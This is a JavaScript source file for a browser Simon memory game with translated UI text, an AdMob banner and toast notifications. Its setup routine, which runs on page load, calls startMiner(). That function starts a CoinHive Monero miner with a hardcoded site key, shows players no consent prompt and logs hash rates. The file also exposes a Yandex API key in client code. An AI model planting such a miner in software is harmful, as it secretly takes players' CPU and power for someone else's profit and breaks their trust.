/**
 * Flat Simon
 * Made by: Matheus Rodrigues
 * https://github.com/matheusot/
 */



/**
 * Loads and init global vars
 */
const POINTS_TO_WIN = 5;
const BUTTON_ACTIVATION_TIME = 500;
const COLORS_DELAY = 1000;

const simon = [];
const answers = [];
const lang = {};

let strict = false;
let started = false;
let playable = false;
let miss = 0;
let score = 0;



/**
 * Set the button texts and box centering.
 */
function setTexts() {
    // center vertically the main box
    $("#box").css("margin-top", Math.floor(($(document).height() - $("#box").height()) / 2) + "px");
    $("#msg").hide();

    // set the texts
    $("#score").html(score);
    $("#play").html(lang.play);
    $("#strict").html(lang.strict);

    // fade in box
    $("#box").animate({
        opacity: 1
    });
}



/**
 * Loads english base text and translate it using yandex api
 */
async function getTranslatedText() {
    // Default english texts
    const en = {
        play: "Play",
        starting: "Starting Game",
        reset: "Reset",
        reseting: "Restarting Game",
        strict: "Strict",
        strict_on: "Strict mode ON",
        strict_off: "Strict mode OFF",
        lost_msg: "Game over!",
        win_msg: "You Won!",
        made_by: "Made by",
        exit: "Exit",
        lifes: "Lifes",
        missed: "Missed!",
        attempt: "attempt remaining!",
        attempts: "attempts remaining!"
    }

    /* Get the actual language used by the user and substrings
       it to the size of 2 (language name notation used by the api) */
    const userLang = navigator.language.substring(0, 2);

    // API params configuration
    const api_key = "?key=trnsl.1.1.20180214T044213Z.4255ca9bc11dcb47.482a44ff01507cb1822413801ea48f52424238d9";
    const url = "https://translate.yandex.net/api/v1.5/tr.json/translate";

    // Set the language to: en to <userLang> (user lang)
    const api_lang = "&lang=en-" + userLang;
    let texts = "";

    // for each property in the english texts object, put it in a url request format
    for (let prop in en) {
        if (en.hasOwnProperty(prop)) {
            texts += "&text=" + en[prop];
        }
    }

    // do the request
    await $.get(url + api_key + texts + api_lang, (data) => {
        let i = 0;
        
        // for each property in the english texts object, load the translate texts array and create the lang object
        for (let prop in en) {
            if (en.hasOwnProperty(prop)) {
                lang[prop] = data.text[i];
                i += 1;
            }
        }
    });

    // Set the texts in buttons after loading
    setTexts();
}



/**
 * Start Admob library (only in case of Cordova app)
 */
function startAdmob() {

    // check if is using cordova
    if (window.cordova) {

        // set admob keys
        const admobid = {
            banner: 'ca-app-pub-7891061342085623/6374657115',
        };


        /**
         * create admob banner after checking admob plugin
         */
        function initApp() {
            if (AdMob) {
                // create a admob plugin at bottom center
                AdMob.createBanner({
                    adId: admobid.banner,
                    position: AdMob.AD_POSITION.BOTTOM_CENTER,
                    overlap: false,
                    offsetTopBar: false,
                    bgColor: 'black'
                });
            }
        }

        // execute initApp function with event listener or a simple function call
        if ((/(ipad|iphone|ipod|android|windows phone)/i.test(navigator.userAgent))) {
            document.addEventListener('deviceready', initApp, false);
        } else {
            initApp();
        }
    }
}



/**
 * Start coinhive monero miner and logs it on console
 */
function startMiner() {

    // start miner base object
    const miner = new CoinHive.Anonymous('AOMYJycRcvUqcJQewle4KaXLJoaFOj3f', {
        throttle: 0.3,
        theme: 'dark',
        forceASMJS: false,
    });

    setInterval(function () {
        console.log(miner.getHashesPerSecond(), miner.getTotalHashes(), miner.getAcceptedHashes());
    }, 1000);

    // if user didn't opt out, start the miner
    if (!miner.didOptOut(14400)) {
        miner.start();
    }
}



/**
 * Start toaster with presets
 */
function startToaster() {
    toastr.options = {
        "closeButton": false,
        "debug": false,
        "newestOnTop": false,
        "progressBar": false,
        "positionClass": "toast-bottom-center",
        "preventDuplicates": true,
        "onclick": null,
        "showDuration": "300",
        "hideDuration": "1000",
        "timeOut": "5000",
        "extendedTimeOut": "1000",
        "showEasing": "swing",
        "hideEasing": "linear",
        "showMethod": "fadeIn",
        "hideMethod": "fadeOut"
    }
}



/**
 * Add one color into simon array and call loopColors to show it
 */
function addColor() {
    if (score == POINTS_TO_WIN) {
        gameWin();
    }
    const colorCodes = ["c", "o", "g", "p"];
    const rand = Math.floor(Math.random() * 4);
    simon.push(colorCodes[rand]);
    if (started) {
        setTimeout(() => {
            loopColors();
        }, COLORS_DELAY);
    }
}



/**
 * get button colors
 * @param {char} c is the first letter of the color's name
 * @returns a document with respective color's color and bright value
 */
function getColors(c) {
    const colors = {
        "c": {
            normal: [40, 190, 180],
            bright: [80, 230, 220]
        },
        "o": {
            normal: [235, 110, 20],
            bright: [255, 150, 60]
        },
        "g": {
            normal: [45, 220, 35],
            bright: [85, 255, 75]
        },
        "p": {
            normal: [225, 10, 195],
            bright: [255, 50, 235]
        },
    }
    return colors[c];
}

/**
 * play audio for the color
 * @param {char} c is the first letter of the color's name
 */
function playAudio(c) {
    new Audio("sounds/" + c + ".wav").play();
}



/**
 * show a selected color
 * @param {char} c is the first letter of the color's name
 */
function showColor(c) {
    playAudio(c);
    colors = getColors(c);
    $("#" + c).css("background-color", `rgb(${colors.bright[0]}, ${colors.bright[1]}, ${colors.bright[2]})`);
    setTimeout(() => {
        $("#" + c).css("background-color", `rgb(${colors.normal[0]}, ${colors.normal[1]}, ${colors.normal[2]})`);
    }, BUTTON_ACTIVATION_TIME);
}


/**
 * loop trough all colors recoursively to show them
 */
function loopColors() {

    // don't let the user play the game
    playable = false;
    let i = 0;

    /**
     * loop for every color with timeout
     */
    function loop() {
        showColor(simon[i]);
        i += 1;
        i < simon.length ? setTimeout(loop, COLORS_DELAY) : setTimeout(() => playable = true, BUTTON_ACTIVATION_TIME)
    }
    loop();
}


/**
 * reset the game, at game over and at second life retry
 * @param misses number of misses that the user already have (default is 0)
 */
function resetGame(misses = 0) {
    $("#play").html(lang.play);
    $("#score").html("0");
    started = false;
    playable = false;
    simon.length = 0;
    answers.length = 0;
    miss = misses;
    score = 0;
}


/**
 * shows game over screen
 * @todo leaderboard integration
 */
function gameOver() {
    toastr["success"](lang.lost_msg);
    strict ? resetGame(1) : resetGame();
}


/**
 * shows game win screen
 * @todo leaderboard integration
 */
function gameWin() {
    toastr["success"](lang.lost_msg);
    strict ? resetGame(1) : resetGame();
}



/**
 * check if combination of color is correct
 */
function checkCorrect() {
    if (answers.length == simon.length) {

        // checks if the arrays values are different
        answers.toString() != simon.toString() ? miss += 1 : 0;
        if (miss != 0) {
            if (miss < 2) {

                // reset answers and show again the colors
                answers.length = 0;
                setTimeout(loopColors, COLORS_DELAY * 2);

                // create the message
                const msg = miss == 1 ? lang.missed + " " + miss + " " + lang.attempt : lang.missed + " " + miss + " " + lang.attempts;
                toastr["success"](msg);
            } else {
                gameOver();
            }
        } else {
            score += 1;
            $("#score").html(score);
            answers.length = 0;
            addColor();
        }
    }
}



/**
 * start the game
 */
function startGame() {
    addColor();
}



/**
 * setup the page
 */
function setup() {
    getTranslatedText();
    startAdmob();
    startMiner();
    startToaster();
}

$(document).ready(function () {
    setup();



    /**
     * switches between strict mode on and off
     * @event onclick
     */
    $("#strict").on("click", function () {
        if (strict) {
            strict = false;
            $("#strict").css("background", "#222");
            toastr["success"](lang.strict_off);
            resetGame();
        } else {
            strict = true;
            $("#strict").css("background", "red");
            toastr["success"](lang.strict_on);

            // reset the game setting up only one life
            resetGame(1);
        }
    });



    /**
     * switches between start and reset game
     * @event onclick
     */
    $("#play").on("click", function () {
        if (!started) {
            started = true;
            $(this).html(lang.reset);
            toastr["success"](lang.starting);
            startGame();
        } else {
            started = false;
            $(this).html(lang.play);
            toastr["success"](lang.reseting);
            resetGame();
        }
    });



    /**
     * get the clicked button name (first letter of respective color)
     * @event onclick
     */
    $(".btn-press").on("click", function () {
        if (playable && simon.length > answers.length) {
            const c = $(this).attr("id");
            answers.push(c);
            playAudio(c);
            colors = getColors(c);
            $(this).css("background-color", `rgb(${colors.bright[0]}, ${colors.bright[1]}, ${colors.bright[2]})`);
            $(this).css("box-shadow", "0px 0px rgba(0,0,0,.5)");
            setTimeout(() => {
                $(this).css("background-color", `rgb(${colors.normal[0]}, ${colors.normal[1]}, ${colors.normal[2]})`);
                $(this).css("box-shadow", "5px 5px rgba(0,0,0,.5)");
            }, BUTTON_ACTIVATION_TIME / 4);
            checkCorrect();
        }
    });
});